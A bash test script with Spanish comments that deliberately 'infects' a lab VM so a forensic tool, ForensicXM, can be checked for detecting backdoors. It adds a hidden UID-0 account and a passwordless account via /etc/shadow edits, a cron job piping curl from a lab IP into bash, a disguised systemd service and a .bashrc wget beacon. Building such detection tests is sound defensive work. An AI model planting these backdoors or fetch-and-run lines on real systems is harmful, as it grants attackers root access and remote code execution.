#!/bin/bash
# =============================================================
# Escenario VM1 - Backdoors de usuario + Persistencia (CORREGIDO)
# Módulos de ForensicXM probados: -u (usuarios), -p (persistencia)
# Ejecutar como root DENTRO de la VM de pruebas.
#
# CAMBIO RESPECTO A LA VERSIÓN ANTERIOR (v2):
# La versión inicial añadía las líneas de hash con  echo >>  a /etc/shadow.
# Como useradd ya había creado una entrada bloqueada con '!' para cada
# usuario, /etc/shadow acababa con DOS líneas por usuario y el parser de
# ForensicXM solo veía la primera (la bloqueada). Esta versión usa sed
# para REEMPLAZAR la línea de shadow, no añadir una segunda.
# =============================================================
set -e
if [ "$EUID" -ne 0 ]; then echo "Ejecuta con sudo"; exit 1; fi

echo "[*] Infectando VM1 (usuarios + persistencia)..."

# --- 1. Backdoor: usuario con UID 0 oculto (segundo root) ---
# Hash MD5 ($1$) -> tu módulo lo marca como DÉBIL.
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c "soporte tecnico" sysadmin 2>/dev/null || true
# REEMPLAZAR la línea de shadow que creó useradd, no añadir una nueva.
sed -i '/^sysadmin:/d' /etc/shadow
echo 'sysadmin:$1$abc$Hk9s0Xq1pPq8nB7vJ3kZl1:19000:0:99999:7:::' >> /etc/shadow

# --- 2. Cuenta de servicio SIN contraseña ---
useradd -M -s /bin/bash -c "cuenta legacy" webupdate 2>/dev/null || true
sed -i '/^webupdate:/d' /etc/shadow
# Campo de contraseña VACÍO -> login sin password.
echo 'webupdate::19000:0:99999:7:::' >> /etc/shadow

# --- 3. Persistencia vía cron global ---
cat > /etc/cron.d/system-update <<'EOF'
# Tarea de actualización del sistema
* * * * * root curl -s http://192.168.56.200/payload.sh | bash
EOF
chmod 644 /etc/cron.d/system-update

# --- 4. Persistencia vía servicio systemd malicioso ---
cat > /etc/systemd/system/network-helper.service <<'EOF'
[Unit]
Description=Network Helper Daemon

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import socket,subprocess,os;os._exit(0)"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# --- 5. Persistencia vía .bashrc del usuario ---
EXISTE_USER=$(getent passwd 1000 | cut -d: -f1)
if [ -n "$EXISTE_USER" ]; then
  echo '# keepalive' >> /home/$EXISTE_USER/.bashrc
  echo '(wget -q http://192.168.56.200/beacon -O /dev/null &)' >> /home/$EXISTE_USER/.bashrc
fi

echo ""
echo "[+] VM1 infectada. Verificación rápida de /etc/shadow:"
grep -E '^(sysadmin|webupdate):' /etc/shadow
echo ""
echo "[+] Ejecuta:  sudo ./bin/forensicXM -r reporte_vm1.txt"
echo "[+] Esperado en módulo -u:"
echo "      sysadmin   UID 0     Hash MD5 - DEBIL"
echo "      webupdate  UID 1001  Sin Password / hash vacío"
